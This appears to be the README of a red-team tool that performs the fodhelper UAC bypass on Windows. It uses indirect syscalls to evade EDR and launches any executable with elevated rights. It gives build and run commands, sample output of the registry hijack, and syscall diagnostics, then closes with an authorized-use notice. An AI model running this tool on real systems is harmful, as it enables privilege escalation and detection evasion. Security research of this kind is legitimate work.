# FODHelperUACBypass_NG
FODHelperUACBypass_NG

## Usage

### Build

```powershell
# Using MSBuild
msbuild FODHelperUACBypass_NG\FODHelperUACBypass_NG.csproj /p:Configuration=Release /p:Platform=x64

# Or using Visual Studio
# Open FODHelperUACBypass_NG.sln and build in Release/x64
```

### Run

There's a default payload in the repository for testing purposes (dialogbox.exe), but you can specify any executable as the payload.

```powershell
# Execute the UAC bypass
.\FODHelperUACBypass_NG\bin\x64\Release\FODHelperUACBypass_NG.exe c:\path\to\payload.exe 

# Run diagnostic tests
.\FODHelperUACBypass_NG\bin\x64\Release\FODHelperUACBypass_NG.exe -test
```

### Expected Output

```
[*] Creating registry key via indirect syscalls...
[+] Registry key created successfully.
[+] DelegateExecute value set.
[+] Default value set to payload command.
[*] Waiting 10 seconds...
[*] Starting fodhelper.exe...
[+] Fodhelper started successfully.
[*] Waiting 5 seconds...
[*] Removing registry key via indirect syscalls...
[+] Registry key removed successfully.
[+] Operation completed.
```

### Diagnostic Tests

```powershell
.\FODHelperUACBypass_NG.exe -test
```

**Output:**
```
[TEST 1] Getting ntdll base address...
[+] ntdll.dll base: 0x7FFD4DA20000

[TEST 2] Resolving NtClose function...
[+] NtClose address: 0x7FFD4DB81C20

[TEST 3] Extracting syscall number for NtClose...
[+] NtClose SSN: 0xF

[TEST 4] Finding syscall instruction for NtClose...
[+] syscall instruction at: 0x7FFD4DB81C32

[TEST 5] Testing NtDelayExecution (sleep 1 second)...
[+] Slept for 1005ms

[TEST 6] Testing registry path construction...
[+] NT path: \Registry\User\S-1-5-21-...\Software\Classes\ms-settings\Shell\Open\command
```

---

## Resources

- **Original Research**: EvasiveSyscallInjector project (working x64 implementation)
- **Hell's Gate**: VX Underground - Direct Syscalls paper
- **Halo's Gate**: Sektor7 - Evading EDR with Halos Gate
- **NT API Documentation**: Undocumented NT Functions (ntinternals.net)
- **Fodhelper UAC Bypass**: @winscripting (original technique)

---

## Security Notice

**Legal and Ethical Use Only**

This code is provided for:
- ✅ Authorized security research
- ✅ Red team operations with proper authorization
- ✅ Penetration testing on systems you own/have permission to test
- ✅ Educational purposes in controlled environments

**Do NOT use for:**
- ❌ Unauthorized access to computer systems
- ❌ Malicious purposes
- ❌ Any illegal activities

Unauthorized computer access is illegal under laws including the Computer Fraud and Abuse Act (USA), Computer Misuse Act (UK), and similar laws worldwide.

**Always obtain written authorization before testing!**

---

## Credits

Implementation based on techniques from:
- **EvasiveSyscallInjector** - Working x64 indirect syscall implementation
- **Hell's Gate** - SSN extraction technique (VX Underground)
- **Halo's Gate** - Hooked function SSN inference (Sektor7)
- **SysWhispers** - Syscall generation framework (jthuraisamy)
- **Fodhelper UAC bypass** - Original technique (@winscripting)

---

*Last Updated: 2026-03-02*
